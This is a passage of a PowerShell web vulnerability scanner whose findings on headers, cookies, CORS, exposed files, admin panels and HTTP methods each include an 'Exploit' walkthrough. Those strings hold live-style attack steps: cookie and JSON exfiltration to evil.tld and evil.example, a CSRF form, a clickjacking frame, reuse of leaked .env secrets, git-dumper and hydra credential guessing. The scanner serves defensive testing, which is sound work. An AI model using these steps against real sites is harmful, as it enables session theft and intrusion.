    if (-not (Get-HeaderValue -Headers $headers -Name 'X-Content-Type-Options')) {
        Add-Finding -Site $Target.Host -Id 'WEB-034' `
            -Title 'Missing X-Content-Type-Options: nosniff' `
            -Severity 'Low' -Category 'Response Headers' -Endpoint $endpoint `
            -Evidence 'No X-Content-Type-Options header in the response.' `
            -Impact 'Browsers may MIME-sniff a response and execute content whose declared type is not script.' `
            -Exploit 'Upload a file whose extension is innocuous but whose body is HTML/JS (avatar.jpg containing a script tag). If the server serves it as text/plain or image/jpeg and the browser sniffs it, the script executes in the origin. A JSON endpoint loaded through a script tag is another classic entry point.' `
            -Remediation 'Add X-Content-Type-Options: nosniff on every response.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/X-Content-Type-Options'
    }

    # --- Clickjacking ---------------------------------------------------------
    $xfo          = Get-HeaderValue -Headers $headers -Name 'X-Frame-Options'
    $cspHasFrames = ($csp -match 'frame-ancestors')

    if (-not $xfo -and -not $cspHasFrames) {
        Add-Finding -Site $Target.Host -Id 'WEB-035' `
            -Title 'Page can be framed: clickjacking is possible' `
            -Severity 'Medium' -Category 'Response Headers' -Endpoint $endpoint `
            -Evidence 'Neither X-Frame-Options nor CSP frame-ancestors is present.' `
            -Impact 'Any site can embed the page invisibly and capture user clicks on sensitive actions.' `
            -Exploit ("Create evil.html on your own server:`n`n<iframe src='https://target/account/delete' style='width:900px;height:600px;opacity:0.3;position:absolute;top:0;left:0'></iframe>`n<button style='position:absolute;top:210px;left:410px'>Click to claim your prize</button>`n`nAlign the button over the real control and the victim deletes their account while thinking they clicked your button. Use the browser DevTools Frames panel to fine-tune the offset.") `
            -Remediation 'Send X-Frame-Options: SAMEORIGIN and/or Content-Security-Policy: frame-ancestors self.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/X-Frame-Options'
    }

    # --- Referrer-Policy ------------------------------------------------------
    if (-not (Get-HeaderValue -Headers $headers -Name 'Referrer-Policy')) {
        Add-Finding -Site $Target.Host -Id 'WEB-036' `
            -Title 'Missing Referrer-Policy header' `
            -Severity 'Low' -Category 'Response Headers' -Endpoint $endpoint `
            -Evidence 'No Referrer-Policy header in the response.' `
            -Impact 'Full URLs leak to third parties through the Referer header, including tokens embedded in the path or query string.' `
            -Exploit 'Find a page whose URL carries a secret (a reset link with a token in the query string). Click an outbound link and read the Referer received by the third party. If the target logs referrers publicly, you recover the secret.' `
            -Remediation 'Add Referrer-Policy: strict-origin-when-cross-origin.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Referrer-Policy'
    }

    # --- Permissions-Policy ---------------------------------------------------
    if (-not (Get-HeaderValue -Headers $headers -Name 'Permissions-Policy')) {
        Add-Finding -Site $Target.Host -Id 'WEB-037' `
            -Title 'Missing Permissions-Policy header' `
            -Severity 'Info' -Category 'Response Headers' -Endpoint $endpoint `
            -Evidence 'No Permissions-Policy header in the response.' `
            -Impact 'Embedded third-party iframes inherit access to camera, microphone, geolocation and other powerful APIs.' `
            -Exploit 'Embed the page inside an iframe from a partner site and call navigator.geolocation.getCurrentPosition from the parent; with no policy restricting it, the API may be reachable from the framing context.' `
            -Remediation 'Add Permissions-Policy: geolocation=(self), camera=(), microphone=().' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Permissions-Policy'
    }

    # --- Cache control on authenticated content ------------------------------
    $cacheControl = Get-HeaderValue -Headers $headers -Name 'Cache-Control'
    if ($Response.SetCookies.Count -gt 0 -and $cacheControl -notmatch 'no-store|private') {
        $shown = '<absent>'
        if ($cacheControl) { $shown = $cacheControl }

        Add-Finding -Site $Target.Host -Id 'WEB-038' `
            -Title 'Authenticated response may be cached by shared proxies' `
            -Severity 'Low' -Category 'Response Headers' -Endpoint $endpoint `
            -Evidence ("Set-Cookie present but Cache-Control = {0}" -f $shown) `
            -Impact 'A shared proxy or CDN may serve a personalised page to the wrong visitor.' `
            -Exploit 'Log in, note the response, then request the same URL from a clean client through the same CDN edge. If the personalised HTML comes back without authentication, the cache key is missing a Vary/Auth dimension.' `
            -Remediation 'Send Cache-Control: private, no-store on authenticated responses, or add a correct Vary header.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Cache-Control'
    }
}

<#
.SYNOPSIS
    Audits cookie attributes.
#>
function Test-CookieSecurity {
    param([pscustomobject]$Target, [pscustomobject]$Response)

    if ($Response.SetCookies.Count -eq 0) { return }

    foreach ($raw in $Response.SetCookies) {
        $parts = $raw -split ';'
        $pair  = $parts[0].Trim()
        $eq    = $pair.IndexOf('=')
        if ($eq -lt 1) { continue }

        $name       = $pair.Substring(0, $eq).Trim()
        $attributes = $parts | Select-Object -Skip 1 | ForEach-Object { $_.Trim() }

        $hasSecure   = ($attributes -match '^secure$').Count -gt 0
        $hasHttpOnly = ($attributes -match '^httponly$').Count -gt 0
        $sameSiteHit = $attributes | Where-Object { $_ -match '^samesite\s*=' }
        $hasSameSite = $sameSiteHit.Count -gt 0
        $sameSiteVal = ''
        if ($hasSameSite) { $sameSiteVal = $sameSiteHit | Select-Object -First 1 }

        $isSession = ($attributes | Where-Object { $_ -match '^expires\s*=' }).Count -eq 0
        $setLine   = "Set-Cookie: $raw"

        if (-not $hasSecure) {
            Add-Finding -Site $Target.Host -Id 'WEB-040' `
                -Title ("Cookie '{0}' is set without the Secure flag" -f $name) `
                -Severity 'High' -Category 'Cookies' -Endpoint $Response.Url `
                -Evidence $setLine `
                -Impact 'The cookie is transmitted on plain HTTP, so any network attacker can read and replay it.' `
                -Exploit ("1) Sit on the victim network.`n2) Capture the cookie: tcpdump -i wlan0 -A -s0 port 80 | grep -i set-cookie`n3) Replay it from your machine: curl -H 'Cookie: {0}=...' https://{1}/`n4) The server treats you as the victim until the session expires." -f $name, $Target.Host) `
                -Remediation ("Add Secure to the Set-Cookie for '{0}'." -f $name) `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Cookies'
        }

        if (-not $hasHttpOnly) {
            Add-Finding -Site $Target.Host -Id 'WEB-041' `
                -Title ("Cookie '{0}' is readable from JavaScript (no HttpOnly)" -f $name) `
                -Severity 'Medium' -Category 'Cookies' -Endpoint $Response.Url `
                -Evidence $setLine `
                -Impact 'A single XSS payload is enough to steal the session, even if the victim never leaves the page.' `
                -Exploit ("Confirm in the browser console with document.cookie. Then exfiltrate:`n`nfetch('https://evil.tld/steal?c=' + encodeURIComponent(document.cookie))`n`nOn evil.tld, read the query string from the access log and replay the cookie with curl or a browser extension.") `
                -Remediation ("Add HttpOnly to the Set-Cookie for '{0}'." -f $name) `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Cookies'
        }

        if (-not $hasSameSite) {
            Add-Finding -Site $Target.Host -Id 'WEB-042' `
                -Title ("Cookie '{0}' has no SameSite attribute" -f $name) `
                -Severity 'Medium' -Category 'Cookies' -Endpoint $Response.Url `
                -Evidence $setLine `
                -Impact 'The cookie is attached to cross-site requests, enabling CSRF on state-changing endpoints.' `
                -Exploit ("Host this on evil.tld and get the victim to open it:`n`n<form action='https://{0}/account/email' method='POST'>`n  <input name='email' value='attacker@evil.tld'>`n</form>`n<script>document.forms[0].submit()</script>`n`nThe browser sends the session cookie along with the POST. If the endpoint has no CSRF token, the change is applied silently." -f $Target.Host) `
                -Remediation ("Add SameSite=Lax (or Strict) to the Set-Cookie for '{0}', and keep a CSRF token on state-changing forms." -f $name) `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Set-Cookie/SameSite'
        }
        elseif ($sameSiteVal -match 'none' -and -not $hasSecure) {
            Add-Finding -Site $Target.Host -Id 'WEB-043' `
                -Title ("Cookie '{0}' uses SameSite=None without Secure" -f $name) `
                -Severity 'Medium' -Category 'Cookies' -Endpoint $Response.Url `
                -Evidence $setLine `
                -Impact 'Modern browsers drop the cookie entirely in some contexts, and it still travels over plain HTTP.' `
                -Exploit 'Load the site in an iframe over http:// from a third-party origin and observe that the cookie is either missing or sent unencrypted in the request log.' `
                -Remediation 'Set both Secure and SameSite=None together.' `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Headers/Set-Cookie/SameSite'
        }

        if ($isSession -and $name -notmatch '^(__Host|__Secure)-') {
            Add-Finding -Site $Target.Host -Id 'WEB-044' `
                -Title ("Session cookie '{0}' lacks the __Host-/__Secure- prefix" -f $name) `
                -Severity 'Info' -Category 'Cookies' -Endpoint $Response.Url `
                -Evidence $setLine `
                -Impact 'Cookie prefixes give the browser an extra integrity guarantee against cookie injection from a subdomain.' `
                -Exploit ("Control any subdomain of the target, or find a host header injection. Because the cookie has no __Host- prefix, you can overwrite it from sub.{0} with Domain=.{0}, shadowing the real session cookie." -f $Target.Host) `
                -Remediation 'Rename the cookie to __Host-session (implies Secure, Path=/, no Domain) where possible.' `
                -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Cookies'
        }
    }
}

<#
.SYNOPSIS
    Detects information leakage through banner headers.
#>
function Test-InformationDisclosure {
    param([pscustomobject]$Target, [pscustomobject]$Response)

    $leaky = @(
        @{ Header = 'Server';           Id = 'WEB-050'; Title = 'Server banner discloses the web server software' }
        @{ Header = 'X-Powered-By';     Id = 'WEB-051'; Title = 'X-Powered-By header discloses the technology stack' }
        @{ Header = 'X-AspNet-Version'; Id = 'WEB-052'; Title = 'X-AspNet-Version header discloses the framework version' }
        @{ Header = 'X-Generator';      Id = 'WEB-053'; Title = 'X-Generator header discloses the CMS and its version' }
    )

    foreach ($item in $leaky) {
        $value = Get-HeaderValue -Headers $Response.Headers -Name $item.Header
        if (-not $value) { continue }

        $hasVersion = ($value -match '\d+\.\d+')
        $severity   = 'Info'
        if ($hasVersion) { $severity = 'Low' }

        Add-Finding -Site $Target.Host -Id $item.Id -Title $item.Title `
            -Severity $severity -Category 'Information Disclosure' -Endpoint $Response.Url `
            -Evidence ("{0}: {1}" -f $item.Header, $value) `
            -Impact 'Exact version numbers map directly to public CVE lists, so an attacker knows which exploits to try first.' `
            -Exploit ("Look up the version in the vendor changelog, then search CVE databases. Example workflow for an nginx/Apache banner:`n  curl -sI https://{0}/ | grep -i server   ->  version X.Y.Z`n  searchsploit PRODUCT X.Y.Z`n  nmap --script http-vuln-cve* -p 80,443 {0}" -f $Target.Host) `
            -Remediation ("Remove or obfuscate the {0} header (server_tokens off, expose_php = Off, etc.)." -f $item.Header) `
            -Reference 'https://cve.mitre.org/'
    }
}

# ==============================================================================
#  CORS
# ==============================================================================

<#
.SYNOPSIS
    Probes the CORS policy with a foreign Origin header.
#>
function Test-CorsPolicy {
    param([pscustomobject]$Target)

    $probeOrigin = 'https://evil.example'
    $response = Invoke-HttpProbe -Url $Target.Url -Headers @{ Origin = $probeOrigin }
    if (-not $response.Succeeded) { return }

    $acao = Get-HeaderValue -Headers $response.Headers -Name 'Access-Control-Allow-Origin'
    $acac = Get-HeaderValue -Headers $response.Headers -Name 'Access-Control-Allow-Credentials'

    if (-not $acao) { return }

    $withCreds = ($acac -match 'true')

    if ($acao -eq '*' -and $withCreds) {
        Add-Finding -Site $Target.Host -Id 'WEB-060' `
            -Title 'CORS: wildcard origin combined with credentials' `
            -Severity 'High' -Category 'CORS' -Endpoint $Target.Url `
            -Evidence ("Access-Control-Allow-Origin: *`nAccess-Control-Allow-Credentials: true") `
            -Impact 'The browser refuses to expose credentialed responses when the origin is a wildcard, so cookie-authenticated API calls silently fail for cross-origin clients. Meanwhile any origin still reads non-credentialed responses.' `
            -Exploit ("From any origin:`n`nfetch('https://{0}/api/me', {{credentials:'include'}}).then(r => r.text()).then(console.log)`n`nIf the result is a CORS error while the same call with credentials:'omit' works, the misconfiguration is confirmed." -f $Target.Host) `
            -Remediation 'Either echo the request Origin instead of *, or drop the credentials flag.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/CORS'
    }
    elseif ($acao -eq $probeOrigin -and $withCreds) {
        Add-Finding -Site $Target.Host -Id 'WEB-061' `
            -Title 'CORS reflects any Origin with credentials enabled' `
            -Severity 'High' -Category 'CORS' -Endpoint $Target.Url `
            -Evidence ("Access-Control-Allow-Origin: {0}`nAccess-Control-Allow-Credentials: true" -f $acao) `
            -Impact 'Any website can read authenticated responses from this origin on behalf of a logged-in visitor.' `
            -Exploit ("1) Register a throwaway domain, or use a page you control.`n2) Serve:`n`n<script>`n  fetch('https://{0}/api/me', {{credentials:'include'}})`n    .then(r => r.json())`n    .then(d => fetch('https://evil.example/log?d=' + encodeURIComponent(JSON.stringify(d))))`n</script>`n`n3) Send the link to a logged-in user; their browser attaches the session cookie and the JSON payload lands in your access log." -f $Target.Host) `
            -Remediation 'Validate the Origin against an explicit allow-list and, if you rely on an allow-list, remember to emit Vary: Origin.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/CORS'
    }
    elseif ($acao -eq '*') {
        Add-Finding -Site $Target.Host -Id 'WEB-062' `
            -Title 'CORS allows any origin (wildcard)' `
            -Severity 'Low' -Category 'CORS' -Endpoint $Target.Url `
            -Evidence 'Access-Control-Allow-Origin: *' `
            -Impact 'Fine for public data; risky if the API also returns non-public data behind a bearer token stored in JavaScript.' `
            -Exploit ("If a token lives in localStorage, any site can read it only after the user pastes it. Test with:`n`nfetch('https://{0}/api/me').then(r => r.text()).then(console.log)" -f $Target.Host) `
            -Remediation 'Keep the wildcard only on endpoints that truly serve public data.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/CORS'
    }
}

# ==============================================================================
#  CONTENT ANALYSIS
# ==============================================================================

<#
.SYNOPSIS
    Analyses the HTML body for mixed content, missing SRI and insecure forms.
#>
function Test-ContentSecurity {
    param([pscustomobject]$Target, [pscustomobject]$Response)

    $contentType = Get-HeaderValue -Headers $Response.Headers -Name 'Content-Type'
    if ($contentType -notmatch 'text/html') { return }

    $body = $Response.Content
    if ([string]::IsNullOrWhiteSpace($body)) { return }

    # --- Mixed content --------------------------------------------------------
    if ($Target.Scheme -eq 'https') {
        $mixed = [regex]::Matches($body, '(?:src|href)\s*=\s*["'']http://([^"'']+)["'']') |
                 ForEach-Object { $_.Groups[1].Value } |
                 Where-Object { $_ -notmatch '^https?://' -and $_ -notmatch '^//' } |
                 Sort-Object -Unique

        if ($mixed.Count -gt 0) {
            $sample = ($mixed | Select-Object -First 5) -join ', '
            Add-Finding -Site $Target.Host -Id 'WEB-070' `
                -Title 'Mixed content: HTTP subresources loaded from an HTTPS page' `
                -Severity 'Medium' -Category 'Content Security' -Endpoint $Response.Url `
                -Evidence ("HTTP subresources found: {0}" -f $sample) `
                -Impact 'Passive content (images, CSS) degrades the padlock; active content (scripts) can be replaced by a network attacker and executes with full origin privileges.' `
                -Exploit ("1) Sit on the victim network.`n2) Intercept the plain HTTP request for the subresource and answer it yourself with bettercap and an injected proxy script.`n3) Serve a modified script body (append alert(document.cookie)).`n4) The code runs inside the HTTPS origin because the page itself is trusted.") `
                -Remediation 'Rewrite all subresource URLs to https:// or to protocol-relative // URLs.' `
                -Reference 'https://developer.mozilla.org/docs/Web/Security/Mixed_content'
        }

        # --- Subresource Integrity -------------------------------------------
        $externalScripts = [regex]::Matches($body, '<script[^>]+src\s*=\s*["'']https?://([^"'']+)["''][^>]*>') |
                           ForEach-Object { $_.Value } |
                           Where-Object { $_ -notmatch 'integrity\s*=' }

        if ($externalScripts.Count -gt 0) {
            $count = $externalScripts.Count
            $first = $externalScripts[0] -replace '\s+', ' '
            Add-Finding -Site $Target.Host -Id 'WEB-071' `
                -Title ("{0} external script(s) loaded without Subresource Integrity" -f $count) `
                -Severity 'Info' -Category 'Content Security' -Endpoint $Response.Url `
                -Evidence ("Example tag: {0}" -f $first) `
                -Impact 'A compromised CDN or a DNS hijack of the CDN domain silently replaces the script that runs on the page.' `
                -Exploit '1) Identify the CDN domain from the script URL. 2) If you control the network, spoof the CDN DNS answer or the TLS session and serve a modified file. 3) Without an integrity hash the browser accepts it and your payload runs in the origin.' `
                -Remediation 'Add integrity="sha384-..." and crossorigin="anonymous" to every external script tag.' `
                -Reference 'https://developer.mozilla.org/docs/Web/Security/Subresource_Integrity'
        }
    }

    # --- Insecure form actions ------------------------------------------------
    $formActions = [regex]::Matches($body, '<form[^>]*action\s*=\s*["''](http://[^"'']+)["'']') |
                   ForEach-Object { $_.Groups[1].Value } |
                   Sort-Object -Unique

    if ($formActions.Count -gt 0 -and $Target.Scheme -eq 'https') {
        Add-Finding -Site $Target.Host -Id 'WEB-072' `
            -Title 'HTML form posts to a plain HTTP endpoint' `
            -Severity 'Medium' -Category 'Content Security' -Endpoint $Response.Url `
            -Evidence ("Action(s): {0}" -f ($formActions -join ', ')) `
            -Impact 'Credentials and form data submitted through that form travel in clear text, even though the page itself is HTTPS.' `
            -Exploit 'Intercept the POST with: tcpdump -i wlan0 -A port 80. Every field of the form, including passwords, is readable. Modify values on the fly with mitmproxy to test server-side validation.' `
            -Remediation 'Point the form action to the https:// URL.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTML/Element/form'
    }

    # --- Directory listing ----------------------------------------------------
    if ($body -match '<title>\s*Index of /' -or $body -match '<h1>Index of /') {
        Add-Finding -Site $Target.Host -Id 'WEB-073' `
            -Title 'Directory listing is enabled' `
            -Severity 'Low' -Category 'Content Security' -Endpoint $Response.Url `
            -Evidence 'The response body contains an Index of / listing page.' `
            -Impact 'The full content of directories without an index file is browsable, often revealing backups, sources and old versions.' `
            -Exploit ("Walk the tree: wget -r -np -nH --cut-dirs=1 -R 'index.html*' https://{0}/ then grep the result for credentials: grep -riE 'password|secret|api_key' .`nAlso try /backup/, /old/, /src/, /test/." -f $Target.Host) `
            -Remediation 'Add an index file, or disable auto-indexing in the web server configuration.' `
            -Reference 'https://httpd.apache.org/docs/current/mod/mod_autoindex.html'
    }

    # --- Password field autocomplete -----------------------------------------
    if ($body -match '<input[^>]+type\s*=\s*["'']password["''][^>]*>') {
        $pwdInputs = [regex]::Matches($body, '<input[^>]+type\s*=\s*["'']password["''][^>]*>')
        $withoutAutocomplete = $pwdInputs | Where-Object { $_.Value -notmatch 'autocomplete\s*=' }

        if ($withoutAutocomplete.Count -gt 0) {
            $tag = ($withoutAutocomplete | Select-Object -First 1).Value -replace '\s+', ' '
            Add-Finding -Site $Target.Host -Id 'WEB-074' `
                -Title 'Password field has no explicit autocomplete attribute' `
                -Severity 'Info' -Category 'Content Security' -Endpoint $Response.Url `
                -Evidence $tag `
                -Impact 'Browsers guess the behaviour, which can leak the password into the wrong field or prevent a password manager from filling it.' `
                -Exploit 'Low severity; mostly a usability and consistency issue exploited by credential-harvesting clones of the login page.' `
                -Remediation 'Add autocomplete="current-password" or autocomplete="new-password" explicitly.' `
                -Reference 'https://developer.mozilla.org/docs/Web/HTML/Attributes/autocomplete'
        }
    }
}

# ==============================================================================
#  DEEP SCAN CHECKS
# ==============================================================================

<#
.SYNOPSIS
    Probes well-known sensitive files and endpoints.
#>
function Test-SensitiveFiles {
    param([pscustomobject]$Target)

    $probes = @(
        @{ Path = '/.git/HEAD';   Id = 'WEB-080'; Sev = 'High';     Cat = 'Information Disclosure'; Title = 'Exposed .git directory (source code leak)'; Signature = 'ref: refs/';   Desc = 'The repository metadata is served by the web server.' }
        @{ Path = '/.git/config'; Id = 'WEB-081'; Sev = 'Medium';   Cat = 'Information Disclosure'; Title = 'Exposed .git/config file';                  Signature = '[core]';       Desc = 'The git configuration, including remote URLs and possibly credentials, is readable.' }
        @{ Path = '/.env';        Id = 'WEB-082'; Sev = 'Critical'; Cat = 'Information Disclosure'; Title = 'Exposed .env file (secrets leak)';            Signature = '=';            Desc = 'The environment file containing application secrets is publicly readable.' }
        @{ Path = '/.svn/entries';Id = 'WEB-083'; Sev = 'Medium';   Cat = 'Information Disclosure'; Title = 'Exposed .svn directory';                     Signature = '';             Desc = 'Subversion metadata is served, leaking the file tree and old revisions.' }
        @{ Path = '/web.config';  Id = 'WEB-084'; Sev = 'Medium';   Cat = 'Information Disclosure'; Title = 'Exposed web.config file';                    Signature = 'configuration';Desc = 'ASP.NET configuration is readable, including connection strings in some deployments.' }
        @{ Path = '/phpinfo.php'; Id = 'WEB-085'; Sev = 'Low';      Cat = 'Information Disclosure'; Title = 'phpinfo() page exposed';                     Signature = 'phpinfo()';    Desc = 'A full PHP environment dump is publicly reachable.' }
        @{ Path = '/server-status';Id = 'WEB-086';Sev = 'Low';      Cat = 'Information Disclosure'; Title = 'Apache server-status page exposed';          Signature = 'Apache Server Status'; Desc = 'Live request table, client IPs and worker states are visible.' }
        @{ Path = '/swagger.json';Id = 'WEB-087'; Sev = 'Low';      Cat = 'Information Disclosure'; Title = 'Swagger / OpenAPI specification exposed';    Signature = 'swagger';      Desc = 'The full API contract is public.' }
        @{ Path = '/openapi.json';Id = 'WEB-088'; Sev = 'Low';      Cat = 'Information Disclosure'; Title = 'OpenAPI specification exposed';              Signature = 'openapi';      Desc = 'The full API contract is public.' }
        @{ Path = '/actuator/health';Id = 'WEB-089';Sev = 'Medium'; Cat = 'Information Disclosure'; Title = 'Spring Boot Actuator endpoint exposed';      Signature = 'status';       Desc = 'Actuator management endpoints are reachable.' }
        @{ Path = '/.well-known/security.txt'; Id = 'WEB-090'; Sev = 'Info'; Cat = 'Governance'; Title = 'Missing security.txt'; Signature = 'Contact'; Desc = 'No machine readable security contact is published.' }
    )

    foreach ($probe in $probes) {
        $url      = Join-TargetUrl -Target $Target -Path $probe.Path
        $response = Invoke-HttpProbe -Url $url

        if (-not $response.Succeeded) { continue }

        if ($probe.Id -eq 'WEB-090') {
            if ($response.StatusCode -eq 200 -and $response.Content -match 'Contact') { continue }

            Add-Finding -Site $Target.Host -Id $probe.Id -Title $probe.Title `
                -Severity $probe.Sev -Category $probe.Cat -Endpoint $url `
                -Evidence 'GET /.well-known/security.txt did not return a valid document.' `
                -Impact 'A researcher reporting a vulnerability has no documented channel, so reports get lost.' `
                -Exploit 'Not exploitable; it is a governance signal. Absence often correlates with an unpatched asset inventory.' `
                -Remediation 'Publish a security.txt with at least Contact, Expires and Preferred-Languages.' `
                -Reference 'https://securitytxt.org/'
            continue
        }

        if ($response.StatusCode -ne 200) { continue }
        if ($response.Length -eq 0) { continue }
        if ($probe.Signature -and $response.Content -notmatch [regex]::Escape($probe.Signature)) { continue }

        $evidence = ("GET {0} -> 200 OK ({1} bytes)" -f $probe.Path, $response.Length)
        $exploit  = ''
        $fix      = ''

        switch ($probe.Id) {
            'WEB-080' {
                $exploit = ("Dump the whole repository:`n  git-dumper https://{0}/.git/ ./src   (or: wget -r -np -nH --cut-dirs=2 -R 'index.html*' https://{0}/.git/)`nThen read the history: git log --oneline, and search for secrets:`n  git log -p | grep -iE 'password|secret|token|api_key'" -f $Target.Host)
                $fix     = 'Block direct access to /.git/ at the web server level, or move the repository outside the document root.'
            }
            'WEB-082' {
                $exploit = ("Read the file: curl -s https://{0}/.env`nTypical keys: DB_PASSWORD, SMTP_PASSWORD, AWS_SECRET_ACCESS_KEY, APP_KEY, JWT_SECRET.`nThen:`n  - reuse DB credentials against an exposed phpMyAdmin/Adminer or the DB port if it is open;`n  - forge a session or JWT with the leaked APP_KEY / JWT_SECRET;`n  - call the cloud API with the leaked access key (aws s3 ls)." -f $Target.Host)
                $fix     = 'Deny access to dotfiles in the web server configuration, or move .env above the document root.'
            }
            'WEB-085' {
                $exploit = 'Read the dump and note DOCUMENT_ROOT, open_basedir, loaded modules and the exact PHP build. Then map the version to a CVE and, if allow_url_include is on, look for an LFI elsewhere to pivot to RCE.'
                $fix     = 'Delete phpinfo.php once the environment is documented, or restrict it to the office IP range.'
            }
            'WEB-089' {
                $exploit = ("Enumerate the siblings:`n  curl https://{0}/actuator          -> list of exposed endpoints`n  curl https://{0}/actuator/env      -> property values (secrets masked as ******)`n  curl https://{0}/actuator/heapdump -o heap.hprof, then grep the heap for credentials`n  curl https://{0}/actuator/mappings -> every route, useful for finding unauthenticated admin paths" -f $Target.Host)
                $fix     = 'Expose only health and info, or put the actuator base path behind authentication.'
            }
            'WEB-087' {
                $exploit = ("Import the spec into Postman or Swagger UI and click through every endpoint. Automate fuzzing with: schemathesis run https://{0}/swagger.json`nLook for endpoints without a security scheme, and for admin paths." -f $Target.Host)
                $fix     = 'Keep the spec public only in non-production environments.'
            }
            default {
                $exploit = ("Inspect the file manually: curl -s https://{0}{1} | head -50" -f $Target.Host, $probe.Path)
                $fix     = 'Serve it deliberately, or block the path.'
            }
        }

        Add-Finding -Site $Target.Host -Id $probe.Id -Title $probe.Title `
            -Severity $probe.Sev -Category $probe.Cat -Endpoint $url `
            -Evidence $evidence -Impact $probe.Desc -Exploit $exploit `
            -Remediation $fix -Reference $url
    }

    # --- Backup and editor leftovers -----------------------------------------
    $backups = @('/index.php.bak', '/index.php~', '/index.php.old', '/index.php.orig',
                 '/.index.php.swp', '/backup.zip', '/backup.tar.gz', '/db.sql',
                 '/composer.json', '/package.json', '/.htaccess')

    foreach ($path in $backups) {
        $url      = Join-TargetUrl -Target $Target -Path $path
        $response = Invoke-HttpProbe -Url $url

        if (-not $response.Succeeded) { continue }
        if ($response.StatusCode -ne 200 -or $response.Length -eq 0) { continue }

        Add-Finding -Site $Target.Host -Id 'WEB-091' `
            -Title ("Backup or configuration file reachable: {0}" -f $path) `
            -Severity 'Medium' -Category 'Information Disclosure' -Endpoint $url `
            -Evidence ("GET {0} -> 200 OK ({1} bytes)" -f $path, $response.Length) `
            -Impact 'Backup files usually contain the unparsed source of a script, sometimes with credentials, and are often months older than the live code.' `
            -Exploit ("Read it: curl -s https://{0}{1} | head -100`nIf it is a source file, extract the database credentials and any hardcoded API keys. If it is an SQL dump, import it locally and compare the schema with the live site to find forgotten columns and users." -f $Target.Host, $path) `
            -Remediation 'Move backups out of the document root, or block them with a rewrite rule.' `
            -Reference 'https://owasp.org/www-project-web-security-testing-guide/'
    }
}

<#
.SYNOPSIS
    Discovers common administrative panels.
#>
function Test-AdminPanels {
    param([pscustomobject]$Target)

    $panels = @('/admin/', '/administrator/', '/wp-admin/', '/wp-login.php',
                '/phpmyadmin/', '/adminer.php', '/manager/html', '/login',
                '/api/', '/graphql')

    foreach ($path in $panels) {
        $url      = Join-TargetUrl -Target $Target -Path $path
        $response = Invoke-HttpProbe -Url $url

        if (-not $response.Succeeded) { continue }
        if ($response.StatusCode -notin 200, 401, 403) { continue }

        $state = switch ($response.StatusCode) {
            200     { 'reachable without authentication' }
            401     { 'protected by HTTP authentication' }
            403     { 'forbidden to anonymous users' }
            default { 'present' }
        }

        Add-Finding -Site $Target.Host -Id 'WEB-092' `
            -Title ("Administrative surface discovered: {0}" -f $path) `
            -Severity 'Info' -Category 'Attack Surface' -Endpoint $url `
            -Evidence ("GET {0} -> {1} {2} ({3})" -f $path, $response.StatusCode, $response.ReasonPhrase, $state) `
            -Impact 'Every exposed panel is a login form: a target for credential stuffing, default passwords and version-specific exploits.' `
            -Exploit ("1) Identify the product from the page body: curl -s https://{0}{1} | grep -iE 'generator|version|powered'`n2) Try default credentials (admin/admin, admin/password, root/root) with hydra.`n3) Check for a version-specific CVE with searchsploit.`n4) If WordPress, run: wpscan --url https://{0} -e vp,u" -f $Target.Host, $path) `
            -Remediation 'Restrict admin paths by IP, enforce MFA, and keep the CMS and plugins patched.' `
            -Reference 'https://owasp.org/www-project-web-security-testing-guide/'
    }
}

<#
.SYNOPSIS
    Enumerates allowed HTTP methods.
#>
function Test-HttpMethods {
    param([pscustomobject]$Target)

    $options = Invoke-HttpProbe -Url $Target.Url -Method 'OPTIONS'

    if ($options.Succeeded) {
        $allow = Get-HeaderValue -Headers $options.Headers -Name 'Allow'

        if ($allow) {
            if ($allow -match '\bTRACE\b') {
                Add-Finding -Site $Target.Host -Id 'WEB-093' `
                    -Title 'HTTP TRACE method is enabled' `
                    -Severity 'Low' -Category 'HTTP Methods' -Endpoint $Target.Url `
                    -Evidence ("Allow: {0}" -f $allow) `
                    -Impact 'TRACE echoes the request back, including headers, which enables cross-site tracing to bypass HttpOnly cookies on some stacks.' `
                    -Exploit ("curl -X TRACE https://{0}/ -H 'Cookie: x=1' -v   -- if the cookie appears in the echoed body, the method is usable for cross-site tracing." -f $Target.Host) `
                    -Remediation 'Disable TRACE if unused (Apache: TraceEnable off).' `
                    -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Methods/TRACE'
            }
            if ($allow -match '\bPUT\b' -or $allow -match '\bDELETE\b') {
                Add-Finding -Site $Target.Host -Id 'WEB-094' `
                    -Title 'Write methods (PUT/DELETE) are advertised' `
                    -Severity 'Low' -Category 'HTTP Methods' -Endpoint $Target.Url `
                    -Evidence ("Allow: {0}" -f $allow) `
                    -Impact 'If the server honours PUT without authentication, an attacker can drop files in the document root.' `
                    -Exploit ("curl -X PUT https://{0}/test.txt -d 'hello' then curl https://{0}/test.txt`nIf the file is served back, you have write access. Try uploading an .html file to prove stored-content control, and a .js file to be included by other pages." -f $Target.Host) `
                    -Remediation 'Disable unused methods in the web server configuration and require authentication for writes.' `
                    -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Methods'
            }
        }
    }

    $trace = Invoke-HttpProbe -Url $Target.Url -Method 'TRACE'
    $allowOnOptions = ''
    if ($options.Succeeded) { $allowOnOptions = Get-HeaderValue -Headers $options.Headers -Name 'Allow' }

    if ($trace.Succeeded -and $trace.StatusCode -eq 200 -and -not $allowOnOptions) {
        Add-Finding -Site $Target.Host -Id 'WEB-095' `
            -Title 'HTTP TRACE method answers successfully' `
            -Severity 'Low' -Category 'HTTP Methods' -Endpoint $Target.Url `
            -Evidence 'A direct TRACE request returned 200 OK.' `
            -Impact 'Request echo may leak header values back into a cross-site context.' `
            -Exploit ("curl -X TRACE https://{0}/ -H 'X-Probe: 1' -v   -- the echoed message includes the headers you sent." -f $Target.Host) `
